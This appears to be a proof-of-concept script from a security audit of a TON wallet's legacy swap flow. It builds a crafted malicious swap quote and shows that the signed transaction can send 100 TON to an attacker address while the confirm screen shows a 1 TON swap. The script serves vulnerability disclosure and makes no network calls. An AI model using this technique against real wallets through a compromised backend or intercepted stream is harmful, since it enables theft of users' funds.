// KPR-D-01 PoC: legacy TON (Omniston) swap signs server messages verbatim.
// Executes the EXACT code path, in order:
//  1. SSE quote handler: `params.onQuote(data as OmnistonSwapMessages)` —
//     swapsApi/SwapService.ts:339. A TS `as` cast: ZERO runtime validation.
//     (swapsApiGenerated/models/index.ts defines OmnistonSwapMessages as an
//     interface only — grep: 0 FromJSON functions in that file.)
//  2. Mapping: useSwapToTonConnectParams.ts (verbatim lines):
//        const messages = confirmation.messages.map(msg => ({
//            address: msg.targetAddress,
//            amount: msg.sendAmount,
//            payload: Buffer.from(msg.payload, 'hex').toString('base64')
//        }));
//  3. Confirm-screen display: SwapConfirmationNotification.tsx renders
//     confirmation.bidUnits / askUnits / resolverName / slippage — the SAME
//     server object. No emulation list is rendered on this screen and send()
//     is called with zeroFeeEstimation (line ~320).
// The crafted payload below is what a compromised swap backend (baseUrl =
// boot-config web_swaps_url) or a MITM on the swap SSE stream would return.
// No live backend is contacted; the JSON is local.
//
// Run: node poc/kpr-d-01-swap-verbatim.mjs
'use strict';

// --- Step 1: crafted malicious quote, as received over the SSE stream ---
const sseEventData = JSON.stringify({
    messages: [
        {
            // Attacker-controlled destination: NOT a resolver/router.
            targetAddress: 'EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9u',
            // Full wallet balance worth of TON, not the quoted swap input.
            sendAmount: '100000000000', // 100 TON
            // Arbitrary attacker payload (opaque hex; decodes to a plain
            // transfer comment here — any cell the attacker wants).
            payload: '00000000',
            jettonWalletStateInit: undefined
        }
    ],
    quoteId: 'attacker-quote-1',
    resolverName: 'Omniston (Verified)', // display-only, attacker-chosen
    askUnits: '99500000', // claims user receives 99.5 USDT (6 decimals)
    bidUnits: '1000000000', // claims user pays 1 TON (9 decimals)
    protocolFeeUnits: '0',
    tradeStartDeadline: String(Math.floor(Date.now() / 1000) + 600),
    gasBudget: '5000000',
    estimatedGasConsumption: '4000000',
    slippage: 50
});

// The real handler does JSON.parse + `as` cast (SwapService.ts:324-339).
const data = JSON.parse(sseEventData);
const confirmation = data; // `as OmnistonSwapMessages` — no validation happens

// --- Step 2: VERBATIM mapping from useSwapToTonConnectParams.ts ---
const messages = confirmation.messages.map(msg => ({
    address: msg.targetAddress,
    amount: msg.sendAmount,
    payload: Buffer.from(msg.payload, 'hex').toString('base64')
}));
const validUntil = confirmation.tradeStartDeadline
    ? Number(confirmation.tradeStartDeadline)
    : (Date.now() + 10 * 60 * 1000) / 1000;
const tonConnectPayload = { valid_until: validUntil, messages };

// --- Step 3: VERBATIM display fields from SwapConfirmationNotification ---
// shiftedDecimals(BigNumber(x), decimals) == x / 10^decimals for display.
const shift = (units, decimals) => {
    const s = BigInt(units).toString().padStart(decimals + 1, '0');
    const int = s.slice(0, -decimals);
    const frac = s.slice(-decimals).replace(/0+$/, '');
    return frac ? `${int}.${frac}` : int;
};
console.log('=== SIGNED PAYLOAD (what TonConnectEncoder signs) ===');
console.log(JSON.stringify(tonConnectPayload, null, 2));
console.log('=== CONFIRM SCREEN (what the user sees) ===');
console.log('  You pay:    ', shift(confirmation.bidUnits, 9), 'TON');
console.log('  You receive:', shift(confirmation.askUnits, 6), 'USDT');
console.log('  Provider:   ', confirmation.resolverName);
console.log('  Slippage:   ', (Number(confirmation.slippage) / 100).toFixed(2) + '%');
console.log('');
console.log('DIVERGENCE: screen shows pay=1 TON / receive=99.5 USDT,');
console.log('but the signed message sends 100 TON to an attacker address.');
console.log('No check compares sendAmount<->bidUnits, targetAddress<->known');
console.log('resolver, or payload min-out<->askUnits anywhere on this path.');
console.log('');
console.log('CONTRAST: multichain swaps run validateAndOrderMultichainSwapPayloads');
console.log('(chainkit/multichainSwapService.ts:779) + checkPayloadAgainstRoute —');
console.log('the legacy path has no equivalent.');
